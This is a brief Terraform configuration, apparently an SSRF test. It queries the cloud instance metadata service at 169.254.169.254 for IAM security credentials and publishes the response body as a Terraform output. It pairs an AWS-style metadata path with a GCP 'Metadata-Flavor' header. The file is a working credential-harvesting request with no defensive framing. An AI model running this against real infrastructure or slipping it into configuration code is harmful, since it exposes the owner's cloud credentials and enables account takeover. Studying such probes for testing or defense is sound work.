data "http" "ssrf_test" {
  url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  
  request_headers = {
    Accept = "application/json"
    Metadata-Flavor = "Google"
  }
}

output "internal_data" {
  value = data.http.ssrf_test.response_body
}
